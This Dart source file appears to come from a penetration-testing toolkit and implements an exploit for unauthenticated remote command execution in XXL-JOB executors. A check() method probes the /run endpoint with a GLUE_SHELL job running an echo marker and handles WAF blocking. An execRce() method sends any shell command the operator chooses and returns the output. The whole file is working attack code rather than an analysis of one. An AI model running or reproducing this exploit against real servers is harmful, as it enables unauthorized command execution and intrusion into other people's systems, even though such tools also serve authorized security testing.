import 'dart:convert';

import 'exp_result.dart';
import 'waf_detect.dart';
import '../../../core/http/http_client.dart';

class XxlJobExpService {
  final String baseUrl;
  final Duration timeout;

  XxlJobExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  Future<ExpResult> check() async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': 'demoJobHandler',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': 1586629003729,
        'glueType': 'GLUE_SHELL',
        'glueSource': 'echo xxljob_54289',
        'glueUpdatetime': 1586699003758,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await _httpClient.postOrThrow(
        '$_base/run',
        headers: {'Content-Type': 'application/json'},
        body: payload,
      );
      final body = res.body ?? '';
      if (looksLikeWafBlock(res.statusCode, body)) {
        return ExpResult.probeFailed(
          'XXL-JOB 未授权 RCE',
          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
        );
      }
      // 必须是执行器返回的业务 code=200；旧实现只要响应体出现 "200" 就算命中，
      // 连 404 页面的 "404" 里都可能误判（例如 {"code":404}）。
      var accepted = false;
      String? msg;
      try {
        final decoded = jsonDecode(body);
        if (decoded is Map && decoded['code'] == 200) {
          accepted = true;
          msg = '${decoded['msg'] ?? ''}';
        }
      } catch (_) {
        accepted = RegExp(r'"code"\s*:\s*200').hasMatch(body);
      }
      if (accepted) {
        return ExpResult(
          true,
          'XXL-JOB 未授权 RCE',
          '执行器 /run 未授权调用成功${msg == null || msg.isEmpty ? '' : '（$msg）'}',
        );
      }
    } catch (e) {
      return ExpResult.probeFailed('XXL-JOB 未授权 RCE', '探测失败: $e');
    }
    return ExpResult(false, 'XXL-JOB 未授权 RCE', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': 'demoJobHandler',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': DateTime.now().millisecondsSinceEpoch,
        'glueType': 'GLUE_SHELL',
        'glueSource': cmd,
        'glueUpdatetime': DateTime.now().millisecondsSinceEpoch,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await _httpClient.postOrThrow(
        '$_base/run',
        headers: {'Content-Type': 'application/json'},
        body: payload,
      );
      return res.body;
    } catch (_) {
      return null;
    }
  }
}
